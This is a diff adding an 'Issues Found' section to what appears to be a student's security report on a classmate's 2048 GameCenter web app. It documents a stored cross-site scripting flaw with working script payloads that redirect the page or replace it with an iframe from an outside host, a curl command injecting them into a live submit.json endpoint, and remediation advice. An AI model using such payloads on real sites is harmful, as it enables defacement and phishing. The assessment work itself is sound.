@@ -5,6 +5,7 @@
 <head>
 <title>2048 GameCenter Security Report</title>
 <link href="http://kevinburke.bitbucket.org/markdowncss/markdown.css" rel="stylesheet"></link>
+<link href="index.css" rel="stylesheet"></link>
 <meta charset="utf-8">
 </head>
 
@@ -22,6 +23,40 @@
 
 <p>Next "white box" testing performed. This testing is performed by reviewing source code and application systems to look for potential weaknesses. Any insecurities that are discovered this way are then confirmed by using them against the actual application.</p>
 
+<h2>Abstract Findings</h2>
+
+<h2>Issues Found</h2>
+
+<h3>1. Cross-Site Scripting</h3>
+
+<ul>
+	<li>Affects: GET on / Route and /scores.json Route</li>
+	<li>Severity: HIGH - This vulnerability allows arbitrary code to be executed on the / route as well as on any page that uses the /scores.json API without escaping the content. As demonstrated below this can even be extended to make an entirely different page appear on the GameCenter domain.</li>
+	<li><p>This issue was essentially found for me as Ming attacked Sidd's page before I got to it by inserting:</p>
+	<code>
+		&lt;script&gt;
+            window.location = "https://www.youtube.com/watch?v=b4810hS8weQ";
+        &lt;/script&gt;
+    </code>
+    <p>into one of the username fields by POSTing to /submit.json. Since this code redirects immediately to a Muppets' YouTube video, I was unable to easily view Sid's leaderboard to see if my intrusion attempts were succeeding.</p>
+    <p>To circumvent this I inserted my own script:</p>
+
+<pre><code>
+&lt;script&gt;
+    $('head').append('&lt;link rel="stylesheet" href="http://www.eecs.tufts.edu/~spanar01/lol.css"&gt;');
+    document.body.innerHTML = '&lt;div id="content"&gt;&lt;iframe width="100%" height="100%" frameborder="0"
+                                src="http://www.eecs.tufts.edu/~spanar01/parser.html"&gt;&lt;/iframe&gt;&lt;/div&gt;';
+&lt;/script&gt;
+</code></pre>
+
+    <p>using curl:</p>
+    <code>$ curl --data "username=&lt;script&gt;...&lt;script&gt;&score=10000000&grid=x" http://ancient-crag-7837.herokuapp.com/submit.json</code>
+    <p>By submitting with a higher score than Ming's hack I ensured that my code would be executed before his redirect. I used this opportunity to replace the contents of &lt;body&gt; with an iframe pointing to a website that I control. I also inserted a link to a css file into the &lt;head&gt; of the document to make the iframe take up the whole page.</p>
+    <p>For now my website simply displays Sidd's scoreboard with offending javascript (like Ming's) stripped, but in the future it could display any page, as exemplified below.</p>
+    <img src="img/mysite-xss.png" alt="My personal website serving a modified version of Sidd's page.">
+    <img src="img/siddsite-xss.png" alt="Sidd's site displaying my modified web page in an iframe.">
+    <li>This vulnerability can be resolved by sanitizing any user input to the /submit.json API before inserting it into the database. Sanitization could be accomplished by custom code, but it is a better idea to use a pre-existing library that has been tested and used by the community. One potential candidate is <a href="https://github.com/chriso/validator.js">validator.js</a>. Additionally, access to the post API can be restricted to trusted 2048 clients (although API input should still be sanitized).</li>
+</ul>
 
 </body>
 
